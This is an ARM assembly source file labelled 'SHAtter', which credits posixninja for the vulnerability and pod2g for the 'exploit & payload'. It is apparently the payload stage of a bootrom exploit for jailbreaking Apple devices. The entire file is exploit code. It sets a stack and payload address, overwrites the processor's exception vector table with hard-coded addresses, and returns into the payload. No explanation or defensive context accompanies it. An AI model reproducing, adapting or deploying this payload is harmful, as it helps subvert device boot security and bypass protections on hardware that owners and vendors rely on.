@ SHAtter
@
@ vulnerability     by posixninja 07/05/2010
@ exploit & payload by pod2g      07/09/2010
@
@ thanks to chronicdev team and iphonedev team

.text

@constants -----------------------------------
.pool
.set	payload_start,			0x8402f5c1
.set    instr_reset_vector,             0xea00000e
.set    addr_prefetch_abort_vector,     0x6780
.set    addr_reserved_vector,           0x6798
.set    addr_irq_vector,                0x6714
.set    addr_fiq_vector,                0x6724
.set	stack_address,			0x8402c000

@main code -----------------------------------
.code 32
_start: .global _start
	LDR	SP,	=stack_address
	LDR	LR,	=payload_start

	STMFD   SP!,	{R0-R1, LR}

	LDR     R0,     =instr_reset_vector
        MOV     R1,     #0
        STR     R0,     [R1]
        LDR     R0,     =addr_prefetch_abort_vector
        MOV     R1,     #0x30
        STR     R0,     [R1]
        LDR     R0,     =addr_reserved_vector
        MOV     R1,     #0x34
        STR     R0,     [R1]
        LDR     R0,     =addr_irq_vector
        MOV     R1,     #0x38
        STR     R0,     [R1]
        LDR     R0,     =addr_fiq_vector
        MOV     R1,     #0x3C
        STR     R0,     [R1]

	LDMFD   SP!,	{R0-R1, PC}^

